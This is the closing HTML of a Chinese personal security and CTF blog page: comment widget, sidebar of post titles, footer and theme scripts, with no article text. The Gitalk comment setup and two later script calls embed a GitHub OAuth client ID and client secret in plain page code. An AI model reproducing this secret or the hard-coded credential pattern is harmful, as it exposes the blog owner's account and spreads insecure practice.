fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/" alt="支付宝"></span></a><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2022/08/31/nssr45/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">NSSRound#4&amp;5 Web题解</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2022/05/30/Dest0g3/"><span class="level-item">Dest0g3 520迎新赛</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--><div class="card"><div class="card-content"><div class="title is-5">评论</div><div id="comment-container"></div><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/gitalk/1.6.0/gitalk.css"><script> $.getScript('/js/gitalk.min.js', function () { 
            var gitalk = new Gitalk({
            language:'zh-CN',
            id: '1b58be0a0c471a397a7871bb70a89235',
            repo: 'blog_comment',
            owner: 'LHXHL',
            clientID: '9901fc9cd07fca97d9c5',
            clientSecret: '676e4024a92c4843a002172e7c57dd2a9875f238',
            admin: ["LHXHL"],
            createIssueManually: true,
            distractionFreeMode: false,
            perPage: 10,
            pagerDirection: 'last',
            proxy: 'https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token',
            
            enableHotKey: true,
            isLocked: false
        })
        gitalk.render('comment-container')});</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><!--!--><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="https://tvax4.sinaimg.cn/large/e6c9d24egy1h23g1fyyodj20jg0jgwfd.jpg" alt="秋秋晚"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">秋秋晚</p><p class="is-size-6 is-block">Web &amp;&amp; Pentest &amp;&amp; Moonlight</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>白玉盘</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">37</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">14</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/LHXHL" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/LHXHL"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div><div><hr><p id="hitokoto">:D 一言句子获取中...</p><script type="text/javascript" defer>function getYiyan(){
                                $.getJSON("https://v1.hitokoto.cn/", function (data) {
                                if(data){
                                    $('#hitokoto').html("");
                                    $('#hitokoto').append("<strong style='color: #3273dc;'>"+data.hitokoto+"</strong>"+
                                    "<p>"+"来源《"+data.from+"》</p><p>提供者-"+data.creator+"</p>");
                                }});}
                                $(function (){getYiyan();$('#hitokoto').click(function(){getYiyan();})});</script></div></div></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://www.wolai.com/lnk3377/tX4XuAytAbP7kFrakykAbx" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">CTF做题笔记</span></span><span class="level-right"><span class="level-item tag">www.wolai.com</span></span></a></li><li><a class="level is-mobile" href="https://www.wolai.com/lnk3377/sXchgZ2ArybVqFfkTrEsZN" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">打靶机记录</span></span><span class="level-right"><span class="level-item tag">www.wolai.com</span></span></a></li><li><a class="level is-mobile" href="https://zikh26.github.io/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">ZIKH26-Pwn👴</span></span><span class="level-right"><span class="level-item tag">zikh26.github.io</span></span></a></li><li><a class="level is-mobile" href="https://www.yuxuanzhe.com" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">YuXuanZhe-Web佬</span></span><span class="level-right"><span class="level-item tag">www.yuxuanzhe.com</span></span></a></li></ul></div></div></div><!--!--><div class="card widget"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-11-27T08:20:02.326Z">2022-11-27</time></p><p class="title"><a href="/2022/11/27/CC6/">CommonsCollections6利用链分析</a></p><p class="categories"><a href="/categories/JavaSec%E5%AD%A6%E4%B9%A0/">JavaSec学习</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-11-24T12:08:06.363Z">2022-11-24</time></p><p class="title"><a href="/2022/11/24/yjs/">第一届研究生网络安全大赛 Web部分WriteUp</a></p><p class="categories"><a href="/categories/CTF/">CTF</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-11-06T14:36:29.048Z">2022-11-06</time></p><p class="title"><a href="/2022/11/06/CC11/">CommonsCollections1利用链分析---LazyMap链</a></p><p class="categories"><a href="/categories/JavaSec%E5%AD%A6%E4%B9%A0/">JavaSec学习</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-11-03T06:08:43.016Z">2022-11-03</time></p><p class="title"><a href="/2022/11/03/CC1/">CommonsCollections1利用链分析</a></p><p class="categories"><a href="/categories/JavaSec%E5%AD%A6%E4%B9%A0/">JavaSec学习</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-10-29T14:11:42.753Z">2022-10-29</time></p><p class="title"><a href="/2022/10/29/hnctf2022/">HNCTF2022 Web部分WriteUp</a></p><p class="categories"><a href="/categories/CTF/">CTF</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/CTF/"><span class="level-start"><span class="level-item">CTF</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/JavaSec%E5%AD%A6%E4%B9%A0/"><span class="level-start"><span class="level-item">JavaSec学习</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/Misc/"><span class="level-start"><span class="level-item">Misc</span></span><span class="level-end"><span class="level-item tag">1</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/Misc/%E5%AD%A6%E4%B9%A0/"><span class="level-start"><span class="level-item">学习</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/csapp/"><span class="level-start"><span class="level-item">csapp</span></span><span class="level-end"><span class="level-item tag">2</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/csapp/%E5%AD%A6%E4%B9%A0/"><span class="level-start"><span class="level-item">学习</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/pwn/"><span class="level-start"><span class="level-item">pwn</span></span><span class="level-end"><span class="level-item tag">3</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/pwn/%E5%AD%A6%E4%B9%A0/"><span class="level-start"><span class="level-item">学习</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/web/"><span class="level-start"><span class="level-item">web</span></span><span class="level-end"><span class="level-item tag">7</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/web/%E5%AD%A6%E4%B9%A0/"><span class="level-start"><span class="level-item">学习</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li></ul></li><a class="level is-mobile is-marginless" href="/categories/"><span class="level-start"><span class="level-item">查看全部&gt;&gt;</span></span></a></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2022/11/"><span class="level-start"><span class="level-item">十一月 2022</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2022/10/"><span class="level-start"><span class="level-item">十月 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2022/09/"><span class="level-start"><span class="level-item">九月 2022</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2022/08/"><span class="level-start"><span class="level-item">八月 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2022/06/"><span class="level-start"><span class="level-item">六月 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><a class="level is-mobile is-marginless" href="/archives/"><span class="level-start"><span class="level-item">查看全部&gt;&gt;</span></span></a></ul></div></div></div><!--!--><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><!--!--><div class="column-right-shadow is-hidden-widescreen"></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">秋秋晚</a><p class="size-small"><span>&copy; 2022 秋秋晚</span>  Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a> &amp; <a href="https://github.com/removeif/hexo-theme-amazing" target="_blank">Amazing</a> <br><span><span id="statistic-times">loading...</span><script>function createTime(time) {
            var n = new Date(time);
            now.setTime(now.getTime() + 250),
                days = (now - n) / 1e3 / 60 / 60 / 24,
                dnum = Math.floor(days),
                hours = (now - n) / 1e3 / 60 / 60 - 24 * dnum,
                hnum = Math.floor(hours),
            1 == String(hnum).length && (hnum = "0" + hnum),
                minutes = (now - n) / 1e3 / 60 - 1440 * dnum - 60 * hnum,
                mnum = Math.floor(minutes),
            1 == String(mnum).length && (mnum = "0" + mnum),
                seconds = (now - n) / 1e3 - 86400 * dnum - 3600 * hnum - 60 * mnum,
                snum = Math.round(seconds),
            1 == String(snum).length && (snum = "0" + snum),
                document.getElementById("statistic-times").innerHTML = "❤️本站自 <strong>"+time.split(" ")[0].replace(/\//g,".")+"</strong> 已运行 <strong>" + dnum + "</strong> 天 <strong>" + hnum + "</strong> 小时 <strong>" + mnum + "</strong> 分 <strong>" + snum + "</strong> 秒！❤️";
        }var now = new Date();setInterval("createTime('2021/12/31 00:00:00')", 250,"");</script><br></span><div class="size-small"><span>❤️感谢 <strong><span id="busuanzi_value_site_uv">99+</span></strong> 小伙伴的 <strong><span id="busuanzi_value_site_pv">99+</span></strong> 次光临！❤️</span></div></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><script>$.getScript('/js/comment-issue-data.js',function(){loadIssueData('9901fc9cd07fca97d9c5','676e4024a92c4843a002172e7c57dd2a9875f238','LHXHL','blog_comment',false);})</script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script><script type="text/javascript">var pjax = new Pjax({
            elements: "a",//代表点击链接就更新
            selectors: [  //代表要更新的节点
                ".section",
                "title"
            ],
            cache: true,
            cacheBust:false
        })

        function loadBusuanzi(){
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js", function () {});
        }

        function loadMathJax() { //加载mathjax
            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\(', '\)']] } });
                var math = document.getElementsByClassName("entry-content")[0];
                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
            });
        };

        // 开始 PJAX 执行的函数
        document.addEventListener('pjax:send', function () {
        });
        
        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
        document.addEventListener('pjax:complete', function () {
            $(".section").css({opacity:1});
            if(false){
                $.getScript('/js/comment-issue-data.js',function(){loadIssueData('9901fc9cd07fca97d9c5','676e4024a92c4843a002172e7c57dd2a9875f238','LHXHL','blog_comment',false);});
            }
            if(false){
                loadMathJax();
            }
            loadMainJs(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings);
            loadBackTop();
            loadBusuanzi();
            if(typeof loadBanner == 'function'){
                loadBanner();
            }
        });</script></body></html>